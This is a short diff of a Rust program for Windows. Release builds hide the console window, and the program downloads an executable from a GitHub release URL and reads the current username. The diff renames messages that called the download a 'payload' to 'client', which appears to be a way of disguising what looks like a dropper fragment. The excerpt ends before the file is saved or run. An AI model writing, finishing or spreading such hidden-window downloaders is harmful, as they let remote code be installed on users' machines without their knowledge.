@@ -2,15 +2,15 @@
     all(not(debug_assertions), target_os = "windows"),
     windows_subsystem = "windows"
 )]
-use std::{fs, os};
+use std::fs;
 
 #[tokio::main]
 async fn main() {
     println!("Fetching payload...");
     let download_url = "http://github.com/ctih1/kake/releases/latest/download/client.exe";
 
-    let resp = reqwest::get(download_url).await.expect("failed to download payload");
-    let body = resp.bytes().await.expect("Invalid payload");
+    let resp = reqwest::get(download_url).await.expect("failed to download client");
+    let body = resp.bytes().await.expect("Invalid client data");
 
     let username = std::env::var("USERNAME").unwrap();
 
